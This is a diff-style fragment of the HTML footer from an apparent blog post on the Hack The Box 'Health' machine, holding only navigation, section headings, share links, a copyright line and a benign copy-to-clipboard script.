+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#valuable-content"><span class="toc-number">1.</span> <span class="toc-text"> Valuable Content</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-user"><span class="toc-number">2.</span> <span class="toc-text"> Get User</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#open-ports"><span class="toc-number">2.1.</span> <span class="toc-text"> open ports</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#springboard-website"><span class="toc-number">2.2.</span> <span class="toc-text"> springboard website</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#listen-port"><span class="toc-number">2.3.</span> <span class="toc-text"> listen port</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql-injection"><span class="toc-number">2.4.</span> <span class="toc-text"> SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#logon-with-susanne"><span class="toc-number">2.5.</span> <span class="toc-text"> logon with susanne</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-root"><span class="toc-number">3.</span> <span class="toc-text"> Get ROOT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pspy-process-snooping"><span class="toc-number">3.1.</span> <span class="toc-text"> pspy process snooping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#connect-to-mysql"><span class="toc-number">3.2.</span> <span class="toc-text"> connect to mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#port-my-listen"><span class="toc-number">3.3.</span> <span class="toc-text"> port my listen</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#create-fake-webhook"><span class="toc-number">3.4.</span> <span class="toc-text"> create fake webhook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#format-print"><span class="toc-number">3.5.</span> <span class="toc-text"> format print</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-number">4.</span> <span class="toc-text"> Summary</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/09/16/htb-health/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/09/16/htb-health/&text=HTB Health Machine Challenge"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/09/16/htb-health/&title=HTB Health Machine Challenge"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/09/16/htb-health/&is_video=false&description=HTB Health Machine Challenge"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Health Machine Challenge&body=Check out this article: http://example.com/2022/09/16/htb-health/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/09/16/htb-health/&title=HTB Health Machine Challenge"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/09/16/htb-health/&title=HTB Health Machine Challenge"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/09/16/htb-health/&title=HTB Health Machine Challenge"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/09/16/htb-health/&title=HTB Health Machine Challenge"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/09/16/htb-health/&name=HTB Health Machine Challenge&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/09/16/htb-health/&t=HTB Health Machine Challenge"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    Andy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
